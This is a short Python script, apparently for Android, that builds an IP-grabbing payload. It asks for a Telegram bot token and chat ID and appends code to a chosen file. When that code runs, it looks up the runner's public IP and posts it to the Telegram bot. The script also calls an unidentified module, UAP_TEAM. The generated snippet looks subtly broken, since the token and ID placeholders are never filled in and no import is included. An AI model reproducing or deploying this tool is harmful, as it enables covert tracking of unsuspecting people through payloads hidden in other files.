import requests,os
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
def ip():
	ip = requests.get ("https://api.ipify.org").text
	print (f'{R} Your IP :{W} {ip}')
	import UAP_TEAM
	UAP_TEAM.start()
def get_ip():
	ID = input(G+'?')
	tok =input (P+'?')
	os.chdir('/sdcard/Download')
	d=("""ip = requests.get ("https://api.ipify.org").text\ntlg =(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={ip} ')\ni = requests.post(tlg)
	""")
	v = input("output:")
	with open(v, 'a') as (file):
		file.write('{}'.format(d))
import UAP_TEAM
UAP_TEAM.start()